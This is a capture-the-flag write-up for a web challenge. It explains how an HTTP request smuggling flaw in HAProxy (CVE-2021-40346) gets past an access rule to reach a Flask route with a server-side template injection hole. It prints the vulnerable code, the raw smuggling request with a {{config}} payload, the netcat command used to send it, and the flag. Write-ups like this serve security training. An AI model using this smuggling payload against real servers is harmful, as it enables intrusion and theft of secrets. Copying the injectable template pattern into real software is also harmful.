# ## Repeated Lock

**Author:** randN
**Category:** web
**Difficulty:** easy

## Description
```
The students asked for help from Sr. Sergio from TI for deploying a patched version of the new 4841 proxy. This time they protected the server a little better.
```

## Solve
In this challenge a python file is provided and a web page.

```python
from flask import Flask, render_template, render_template_string, request
import os
import utils


app = Flask(__name__)
app.config['SECRET_KEY'] = 'CTFUA{REDACTED}'


@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template('home.html')


@app.route('/admin', methods=['GET', 'POST'])
def admin():
    return 'Under Construction...'


@app.route('/users')
def users():
    username = request.args.get('user', '<User>')
    if utils.filter(username):
        return render_template_string('Hello ' + username + '!')
    else:
        return 'Hello ' + username  + '!'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

```

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/repeated_lock/images/page.png?raw=true)

A careful analysis of the python code, it's possible to see that there is [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) vulnerability in the **users** method, but if we try to access the **users** path we receive a **403 Forbidden**. There is a Server header leaking information about the app infrastructure, and in the challenge description there is a reference to 4841 proxy. This kinda of infra points to a smuggle vulnerability, but let's investigate more.

4841 is the hex value for **HA**, so the proxy used is [HA proxy](http://www.haproxy.org/). Doing some google search about vulnerabilities that may be useful in this case, a smuggling vulnerability appears https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/.

Now we just need to create or payload to smuggle an HTTP request in order to bypass the ACL put in place. Since we want to access the flask SECRET_KEY, lets try the simplest payload `{{config}}`, maybe the filter is wrongly implemented or malfunctioning.

```bash
POST /admin HTTP/1.1
Host: ctf-metared-2021.ua.pt:2011
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 101

GET /users?user=%7B%7Bconfig%7D%7D HTTP/1.1
h:GET /admin HTTP/1.1
Host: ctf-metared-2021.ua.pt:2011
```

Runing the command `cat poc | nc ctf-metared-2021.ua.pt 2011` and that's it. 
Although there is a filter put in place, always try the simplest stuff, because devs make mistakes all the time.

## Flag
CTFUA{Smuggl3_4nD_SST1_3301}
